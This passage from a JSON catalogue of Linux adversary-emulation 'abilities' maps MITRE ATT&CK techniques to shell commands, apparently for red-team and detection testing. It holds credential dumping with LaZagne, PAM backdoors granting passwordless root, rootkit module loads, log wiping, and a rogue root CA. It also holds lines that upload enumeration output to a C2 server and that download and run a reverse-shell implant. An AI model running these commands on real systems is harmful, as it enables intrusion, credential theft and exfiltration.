/tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p", "unlocks": []}, {"id": "4a37cc5d05b6ce7a7287247ecf1aa404", "ability_name": "Hostname Discovery", "description": "Identify system hostname for Linux and macOS systems.\n", "tactic": "discovery", "technique": "System Information Discovery", "platform": "linux", "requirements": [], "command": "hostname", "unlocks": []}, {"id": "c0da588f-79f0-4263-8998-7496b1a40596", "ability_name": "Identify active user", "description": "Find user running agent", "tactic": "discovery", "technique": "System Owner/User Discovery", "platform": "linux", "requirements": [], "command": "whoami", "unlocks": ["host.user.name", "domain.user.name"]}, {"id": "ddc68247897068b0e9afb5e1ecd254d1", "ability_name": "Install root CA on CentOS/RHEL", "description": "Creates a root CA with openssl\n", "tactic": "defense-evasion", "technique": "Subvert Trust Controls: Install Root Certificate", "platform": "linux", "requirements": [], "command": "openssl genrsa -out rootCA.key 4096; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt; cp rootCA.crt /etc/pki/ca-trust/source/anchors/; update-ca-trust", "unlocks": []}, {"id": "ba8d59e23b49ff619ec0b9e81b967a16", "ability_name": "Install root CA on Debian/Ubuntu", "description": "Creates a root CA with openssl\n", "tactic": "defense-evasion", "technique": "Subvert Trust Controls: Install Root Certificate", "platform": "linux", "requirements": [], "command": "if [ -f rootCA.crt ]; then : ; else if [ ! -f rootCA.key ]; then openssl genrsa -out rootCA.key 4096; fi; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt; fi;  ;  mv rootCA.crt /usr/local/share/ca-certificates; echo sudo update-ca-certificates", "unlocks": []}, {"id": "927d62f0c59f2a0832d95562bc3e84e2", "ability_name": "LaZagne.py - Dump Credentials from Firefox Browser", "description": "Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne", "tactic": "credential-access", "technique": "Credentials from Password Stores: Credentials from Web Browsers", "platform": "linux", "requirements": [], "command": "python3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox >> /tmp/firefox_password.txt", "unlocks": []}, {"id": "47d08617-5ce1-424a-8cc5-c9c978ce6bf9", "ability_name": "Leave note", "description": "Create a text file for the user to find", "tactic": "impact", "technique": "Defacement", "platform": "linux", "requirements": [], "command": "echo \"proof that this machine was hacked.\" > message.txt", "unlocks": []}, {"id": "c157df565590c06f433bc25a3ac5a8e9", "ability_name": "LinEnum tool execution", "description": "LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.\n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Bash", "platform": "linux", "requirements": [], "command": "chmod +x PathToAtomicsFolder/T1059.004/src/LinEnum.sh; bash PathToAtomicsFolder/T1059.004/src/LinEnum.sh", "unlocks": []}, {"id": "74117090d6c33ade24c37b5d5b804681", "ability_name": "Linux - Load Kernel Module via insmod", "description": "This test uses the insmod command to load a kernel module for Linux.\n", "tactic": "multiple", "technique": "Boot or Logon Autostart Execution: Kernel Modules and Extensions", "platform": "linux", "requirements": [], "command": "sudo insmod /tmp/T1547.006/T1547006.ko", "unlocks": []}, {"id": "d38cba2905e62b4c1a7e5c88137ce485", "ability_name": "Linux Base64 Encoded Shebang in CLI", "description": "Using Linux Base64 Encoded shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n", "tactic": "defense-evasion", "technique": "Deobfuscate/Decode Files or Information", "platform": "linux", "requirements": [], "command": "echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash", "unlocks": []}, {"id": "3d331538a65d7ebee865a1906f729bad", "ability_name": "Linux Download File and Run", "description": "Utilize linux Curl to download a remote file, chmod +x it and run it.\n", "tactic": "command-and-control", "technique": "Ingress Tool Transfer", "platform": "linux", "requirements": [], "command": "curl -sO", "unlocks": []}, {"id": "46098c66-8d9a-4d23-8a95-dd5021c385ae", "ability_name": "Linux Enumeration & Privilege Escalation Discovery Script", "description": "Download and execute LinEnum.sh", "tactic": "discovery", "technique": "System Information Discovery", "platform": "linux", "requirements": [], "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;", "unlocks": []}, {"id": "d7456d8122cfc76421fc4806934fc448", "ability_name": "Linux List Kernel Modules", "description": "Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.\n", "tactic": "discovery", "technique": "System Information Discovery", "platform": "linux", "requirements": [], "command": "lsmod; kmod list; grep vmw /proc/modules", "unlocks": []}, {"id": "c87a8f2fdbb1714c8674acd1737ca0a5", "ability_name": "Linux VM Check via Hardware", "description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n", "tactic": "discovery", "technique": "System Information Discovery", "platform": "linux", "requirements": [], "command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi; if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi; if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi; if [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi; if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi; if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi; if [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi; if [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi", "unlocks": []}, {"id": "5c010088084e0d6cc72f2632b021dc4d", "ability_name": "Linux VM Check via Kernel Modules", "description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n", "tactic": "discovery", "technique": "System Information Discovery", "platform": "linux", "requirements": [], "command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"; sudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"; sudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"; sudo lsmod | grep -i \"virtio_pci\\|virtio_net\"; sudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"", "unlocks": []}, {"id": "52177cc1-b9ab-4411-ac21-2eadc4b5d3b8", "ability_name": "List Directory", "description": "List contents of current directory", "tactic": "discovery", "technique": "File and Directory Discovery", "platform": "linux", "requirements": [], "command": "ls", "unlocks": []}, {"id": "90cac81169ebb96b4bfdc0c17a507b67", "ability_name": "List Mozilla Firefox Bookmark Database Files on Linux", "description": "Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.\n", "tactic": "discovery", "technique": "Browser Bookmark Discovery", "platform": "linux", "requirements": [], "command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> /tmp/T1217-Firefox.txt \\; cat /tmp/T1217-Firefox.txt 2>/dev/null", "unlocks": []}, {"id": "278b4cdafa0ddc90b98bc2ce8df2c05f", "ability_name": "List OS Information", "description": "Identify System Info\n", "tactic": "discovery", "technique": "System Information Discovery", "platform": "linux", "requirements": [], "command": "uname -a >> /tmp/T1082.txt; if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi; if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   ; if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi; uptime >> /tmp/T1082.txt; cat /tmp/T1082.txt 2>/dev/null", "unlocks": []}, {"id": "958ef3f865356e682d569ff36cbf88de", "ability_name": "List opened files by user", "description": "List opened files by user\n", "tactic": "discovery", "technique": "Account Discovery: Local Account", "platform": "linux", "requirements": [], "command": "username=$(id -u -n) && lsof -u $username", "unlocks": []}, {"id": "e61902c2b48e140b8b89cc106ffe6c35", "ability_name": "Living off the land Terminal Input Capture on Linux with pam.d", "description": "Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n", "tactic": "multiple", "technique": "Input Capture: Keylogging", "platform": "linux", "requirements": [], "command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so enable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so enable=* log_password\" >> /etc/pam.d/system-auth", "unlocks": []}, {"id": "70182ebb9df067f7cb5fe86511dd965c", "ability_name": "Loadable Kernel Module based Rootkit", "description": "Loadable Kernel Module based Rootkit\n", "tactic": "defense-evasion", "technique": "Rootkit", "platform": "linux", "requirements": [], "command": "sudo modprobe T1014", "unlocks": []}, {"id": "0b70a0fd3c25e63253ad773c36cb00f2", "ability_name": "Loadable Kernel Module based Rootkit", "description": "Loadable Kernel Module based Rootkit\n", "tactic": "defense-evasion", "technique": "Rootkit", "platform": "linux", "requirements": [], "command": "sudo insmod PathToAtomicsFolder/T1014/bin/T1014.ko", "unlocks": []}, {"id": "d79fab1bc27bcbb4396f4bb69a109914", "ability_name": "Loadable Kernel Module based Rootkit (Diamorphine)", "description": "Loads Diamorphine kernel module, which hides itself and a processes.\n", "tactic": "defense-evasion", "technique": "Rootkit", "platform": "linux", "requirements": [], "command": "sudo modprobe diamorphine; ping -c 10 localhost >/dev/null & TARGETPID=\"$!\"; ps $TARGETPID; kill -31 $TARGETPID; ps $TARGETPID || echo \"process ${TARGETPID} hidden\"", "unlocks": []}, {"id": "a41c2324-8c63-4b15-b3c5-84f920d1f226", "ability_name": "Locate file from printer queue", "description": "Locate file that appears in the printer queue", "tactic": "discovery", "technique": "File and Directory Discovery", "platform": "linux", "requirements": [], "command": "find ~ -type f -name #{host.print.file} 2>/dev/null", "unlocks": ["host.system.path"]}, {"id": "0f9a074d436196d0796e2cb3ecb964e8", "ability_name": "Logging Configuration Changes on Linux Host", "description": "Emulates modification of syslog configuration.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Indicator Blocking", "platform": "linux", "requirements": [], "command": "if [ -f \"/etc/syslog.conf\" ]; then sed -i '$ a #art_test_1562_006_2' /etc/syslog.conf; fi; if [ -f \"/etc/rsyslog.conf\" ]; then sed -i '$ a #art_test_1562_006_2' /etc/rsyslog.conf; fi; if [ -f \"/etc/syslog-ng/syslog-ng.conf\" ]; then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/syslog-ng.conf; fi", "unlocks": []}, {"id": "3b705c3783af10560a0cdfa46c7bc78f", "ability_name": "Logging bash history to syslog", "description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n", "tactic": "multiple", "technique": "Input Capture: Keylogging", "platform": "linux", "requirements": [], "command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'; echo \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"; tail /var/log/syslog", "unlocks": []}, {"id": "575e90a4ba9a5eb7019c0238681c018a", "ability_name": "Login as nobody (Linux)", "description": "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin.\n", "tactic": "multiple", "technique": "Valid Accounts: Local Accounts", "platform": "linux", "requirements": [], "command": "cat /etc/passwd |grep nobody ; chsh --shell /bin/bash nobody; usermod --password $(openssl passwd -1 nobody) nobody; su nobody; whoami; exit", "unlocks": []}, {"id": "7ecae3350a573cf886e1a51e21b2cbbd", "ability_name": "Make and modify binary from C source", "description": "Make, change owner, and change file attributes on a C source code file\n", "tactic": "multiple", "technique": "Abuse Elevation Control Mechanism: Setuid and Setgid", "platform": "linux", "requirements": [], "command": "cp; sudo chown root /tmp/hello.c; sudo make /tmp/hello; sudo chown root /tmp/hello; sudo chmod u+s /tmp/hello; /tmp/hello", "unlocks": []}, {"id": "2e136b3814e4eb292c9234b5830833e1", "ability_name": "Make and modify capabilities of a binary", "description": "Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.\nThe binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.\nWithout being owned by root, the binary can set the UID to 0.\n", "tactic": "multiple", "technique": "Abuse Elevation Control Mechanism: Setuid and Setgid", "platform": "linux", "requirements": [], "command": "cp; make /tmp/cap; sudo setcap cap_setuid=ep /tmp/cap; /tmp/cap", "unlocks": []}, {"id": "9630f6d2ac825e459abc69a7d692e98b", "ability_name": "Malicious PAM module", "description": "Creates a PAM module, inserts a rule to use it, and then tests it.\n\nUpon successful execution, this test will create a PAM module that allows every user to su to root without a password.\n", "tactic": "multiple", "technique": "Modify Authentication Process: Pluggable Authentication Modules", "platform": "linux", "requirements": [], "command": "if [ -f /tmp/pam_evil.so ]; then : ; else sudo gcc -shared -fPIC -o /tmp/pam_evil.so 8545b9_pam_evil.c; fi; if [ -f /usr/include/security/pam_modules.h ]; then : ; else if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install libpam0g-dev; elif [ -n \"`which yum`\" ]; then sudo yum -y install pam-devel; fi; fi;  ;  sudo sed -i \"1s,^,auth sufficient /tmp/pam_evil.so\\n,g\" /etc/pam.d/su-l", "unlocks": []}, {"id": "f4873fff8940c0507868b38e78de1b0d", "ability_name": "Malicious PAM rule", "description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n", "tactic": "multiple", "technique": "Modify Authentication Process: Pluggable Authentication Modules", "platform": "linux", "requirements": [], "command": "sudo sed -i \"1s,^,auth sufficient pam_succeed_if.so uid >= 0\\n,g\" /etc/pam.d/su-l", "unlocks": []}, {"id": "810ebb2d039e78c1017dcb5efbd4a074", "ability_name": "Malicious User Agents - Nix", "description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "tactic": "command-and-control", "technique": "Application Layer Protocol: Web Protocols", "platform": "linux", "requirements": [], "command": "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com; curl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com; curl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com; curl -s -A \"*<|>*\" -m3 www.google.com", "unlocks": []}, {"id": "356d1722-7784-40c4-822b-0cf864b0b36d", "ability_name": "Manx", "description": "A reverse-shell agent which communicates via the TCP contact", "tactic": "command-and-control", "technique": "Ingress Tool Transfer", "platform": "linux", "requirements": [], "command": "server=\"#{app.contact.http}\";\nsocket=\"#{app.contact.tcp}\";\ncontact=\"tcp\";\ncurl -s -X POST -H \"file:manx.go\" -H \"platform:linux\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -http $server -socket $socket -contact $contact -v", "unlocks": []}, {"id": "bfaa2b76303409212beaf87d88cc8564", "ability_name": "Masquerading as Linux crond process.", "description": "Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.\n\nUpon successful execution, sh is renamed to `crond` and executed.\n", "tactic": "defense-evasion", "technique": "Masquerading: Rename System Utilities", "platform": "linux", "requirements": [], "command": "cp /bin/sh /tmp/crond; echo 'sleep 5' | /tmp/crond", "unlocks": []}, {"id": "0c67915b076b2b044cedb3fe979f4c7e", "ability_name": "Modify SSH Authorized Keys", "description": "Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. \nIf the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.\n", "tactic": "persistence", "technique": "SSH Authorized Keys", "platform": "linux", "requirements": [], "command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi;", "unlocks": ["root"]}, {"id": "e8017c46-acb8-400c-a4b5-b3362b5b5baa", "ability_name": "Network Interface Configuration", "description": "View network configuration info for host", "tactic": "discovery", "technique": "System Network Configuration Discovery", "platform": "linux", "requirements": [], "command": "sudo ifconfig", "unlocks": []}, {"id": "75393d8dae4e8777283b12eacdf63ba0", "ability_name": "Network Share Discovery - linux", "description": "Network Share Discovery using smbstatus\n", "tactic": "discovery", "technique": "Network Share Discovery", "platform": "linux", "requirements": [], "command": "sudo smbstatus --shares", "unlocks": []}, {"id": "11674ad10631f621dd4bdcd611c706ad", "ability_name": "New script file in the tmp directory", "description": "An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.\n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Bash", "platform": "linux", "requirements": [], "command": "TMPFILE=$(mktemp); echo \"id\" > $TMPFILE; bash $TMPFILE", "unlocks": []}, {"id": "7d07e97d0fb537914ab52056b230eb35", "ability_name": "Nix File and Directory Discovery", "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n", "tactic": "discovery", "technique": "File and Directory Discovery", "platform": "linux", "requirements": [], "command": "ls -a >> /tmp/T1083.txt; if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi; file */* *>> /tmp/T1083.txt; cat /tmp/T1083.txt 2>/dev/null; find . -type f; ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'; locate *; which sh", "unlocks": []}, {"id": "feec1b093708c05e2f946a4e32253342", "ability_name": "Nix File and Directory Discovery 2", "description": "Find or discover files on the file system\n", "tactic": "discovery", "technique": "File and Directory Discovery", "platform": "linux", "requirements": [], "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt; if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; find . -type f -iname *.pdf >> /tmp/T1083.txt; cat /tmp/T1083.txt; find . -type f -name \".*\"", "unlocks": []}, {"id": "b6885315a5836b702271546774e7109a", "ability_name": "Obfuscated command line scripts", "description": "An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.\n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Bash", "platform": "linux", "requirements": [], "command": "ART=$(echo -n \"id\" |base64 -w 0); echo \"\\$ART=$ART\"; echo -n \"$ART\" |base64 -d |/bin/bash; unset ART", "unlocks": []}, {"id": "6b895fe897f459d889a8506746095cf7", "ability_name": "Overwrite Linux Log", "description": "This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Linux or Mac System Logs", "platform": "linux", "requirements": [], "command": "echo 0> /var/log/secure", "unlocks": []}, {"id": "9e1fc72961c8e98bc89feeac0b6652e2", "ability_name": "Overwrite Linux Mail Spool", "description": "This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Linux or Mac System Logs", "platform": "linux", "requirements": [], "command": "echo 0> /var/spool/mail/root", "unlocks": []}, {"id": "03a0a74a1396a51c5cb607e787070048", "ability_name": "Overwrite and delete a file with shred", "description": "Use the `shred` command to overwrite the temporary file and then delete it\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: File Deletion", "platform": "linux", "requirements": [], "command": "shred -u /tmp/victim-shred.txt", "unlocks": []}, {"id": "dc594307cc6b1ed451b35e51f192dbac", "ability_name": "Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo", "description": "Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds.\nSOCK_PACKET is \"obsolete\" according to the man page, but still works on Ubuntu 20.04\n", "tactic": "multiple", "technique": "Network Sniffing", "platform": "linux", "requirements": [], "command": "sudo /tmp/t1040_linux_pcapdemo -4 -P -p 17 -t 3", "unlocks": []}, {"id": "23a55c307920b731e16aa89f32d18f7a", "ability_name": "Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo", "description": "Captures packets with domain=AF_INET,type=SOCK_RAW,protocol=TCP for a few seconds.\n", "tactic": "multiple", "technique": "Network Sniffing", "platform": "linux", "requirements": ["sudo"], "command": "sudo /tmp/t1040_linux_pcapdemo -4 -p 6 -t 3", "unlocks": []}, {"id": "7ebfbb078ecbc1808b6539325f9b4f6d", "ability_name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo", "description": "Captures packets with domain=AF_PACKET,type=SOCK_RAW for a few seconds.\nSets a BPF filter on the socket to filter for UDP traffic.\n", "tactic": "multiple", "technique": "Network Sniffing", "platform": "linux", "requirements": ["sudo"], "command": "sudo /tmp/t1040_linux_pcapdemo -a -f -t 3", "unlocks": []}, {"id": "36d1f9546258d3a8ca9489853597acd3", "ability_name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo", "description": "Captures packets with domain=AF_PACKET, type=SOCK_RAW for a few seconds.\n", "tactic": "multiple", "technique": "Network Sniffing", "platform": "linux", "requirements": ["sudo"], "command": "sudo /tmp/t1040_linux_pcapdemo -a -t 3", "unlocks": []}, {"id": "3b2764c4c99a4adec2c68dc264d9e6c4", "ability_name": "Packet Capture Linux using tshark or tcpdump", "description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n", "tactic": "multiple", "technique": "Network Sniffing", "platform": "linux", "requirements": [], "command": "tcpdump -c 5 -nnni ens33; tshark -c 5 -i ens33", "unlocks": []}, {"id": "1003589b9e99d9edbd22cdcd56394f53", "ability_name": "Pad Binary to Change Hash - Linux/macOS dd", "description": "Uses dd to add a zero byte, high-quality random data, and low-quality random data to the binary to change the hash.\n\nUpon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.\n", "tactic": "defense-evasion", "technique": "Obfuscated Files or Information: Binary Padding", "platform": "linux", "requirements": [], "command": "dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary; dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary; dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary", "unlocks": []}, {"id": "5c922d92f383656401d5633ca23db497", "ability_name": "Pad Binary to Change Hash using truncate command - Linux/macOS", "description": "Uses truncate to add a byte to the binary to change the hash.\n\nUpon successful execution, truncate will modify `/tmp/evil-binary`, therefore the expected hash will change.\n", "tactic": "defense-evasion", "technique": "Obfuscated Files or Information: Binary Padding", "platform": "linux", "requirements": [], "command": "truncate -s +1 /tmp/evil-binary", "unlocks": []}, {"id": "02de522f-7e0a-4544-8afc-0c195f400f5f", "ability_name": "Parse SSH config", "description": "Search for valid SSH commands in the config file", "tactic": "collection", "technique": "Data from Local System", "platform": "linux", "requirements": [], "command": "pip install -q stormssh 2> /dev/null && storm list | sed 's/\\x1b\\[[0-9;]*m//g'", "unlocks": ["remote.ssh.cmd"]}, {"id": "5f77ecf9-613f-4863-8d2f-ed6b447a4633", "ability_name": "Parse SSH known_hosts", "description": "View the known_hosts file", "tactic": "discovery", "technique": "Remote System Discovery", "platform": "linux", "requirements": [], "command": "cat ~/.ssh/known_hosts", "unlocks": []}, {"id": "e82f39e2-56f8-4f19-8376-b007f9ac5f8a", "ability_name": "Password Policy", "description": "Password Policy Discovery", "tactic": "discovery", "technique": "Password Policy Discovery", "platform": "linux", "requirements": [], "command": "cat /etc/pam.d/common-password", "unlocks": []}, {"id": "5c4dd985-89e3-4590-9b57-71fed66ff4e2", "ability_name": "Permission Groups Discovery", "description": "Summary of permission and security groups", "tactic": "discovery", "technique": "Permission Groups Discovery: Local Groups", "platform": "linux", "requirements": [], "command": "groups", "unlocks": []}, {"id": "ced42979f76b8fc19c1afffad66beed5", "ability_name": "Permission Groups Discovery (Local)", "description": "Permission Groups Discovery\n", "tactic": "discovery", "technique": "Permission Groups Discovery: Local Groups", "platform": "linux", "requirements": [], "command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi; cat /etc/group", "unlocks": []}, {"id": "62b88a98e32cac28c744db4fcad3a0dd", "ability_name": "Port Scan", "description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n", "tactic": "discovery", "technique": "Network Service Discovery", "platform": "linux", "requirements": [], "command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done", "unlocks": []}, {"id": "d84a4fab3739f1dca177364e5c4b02a4", "ability_name": "Port Scan Nmap", "description": "Scan ports to check for listening ports with Nmap.\n\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of adresseses on port 80 to determine if listening. Results will be via stdout.\n", "tactic": "discovery", "technique": "Network Service Discovery", "platform": "linux", "requirements": [], "command": "if [ -x \"$(command -v telnet)\" ]; then : ; else (which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet); fi; if [ -x \"$(command -v nc)\" ]; then : ; else (which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat); fi; if [ -x \"$(command -v nmap)\" ]; then : ; else (which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap); fi;  ;  sudo nmap -sS 192.168.1.0/24 -p 80; telnet 192.168.1.1 80; nc -nv 192.168.1.1 80", "unlocks": []}, {"id": "d04f015d-1146-4bd9-a8bb-096bc60eaedf", "ability_name": "Preferred WIFI", "description": "See the most used WIFI networks of a machine", "tactic": "discovery", "technique": "System Network Configuration Discovery", "platform": "linux", "requirements": ["scan.info"], "command": "./wifi.sh pref", "unlocks": ["wifi.network.ssid"]}, {"id": "9e93a13a-281b-45fd-97d8-4db1842b5065", "ability_name": "Preferred WIFI", "description": "See the most used WIFI networks of a machine", "tactic": "discovery", "technique": "System Network Configuration Discovery", "platform": "linux", "requirements": ["scan.info"], "command": "./wifi.sh pref", "unlocks": ["wifi.network.ssid"]}, {"id": "a0676fe1-cd52-482e-8dde-349b73f9aa69", "ability_name": "Preferred WIFI", "description": "See the most used WIFI networks of a machine", "tactic": "discovery", "technique": "System Network Configuration Discovery", "platform": 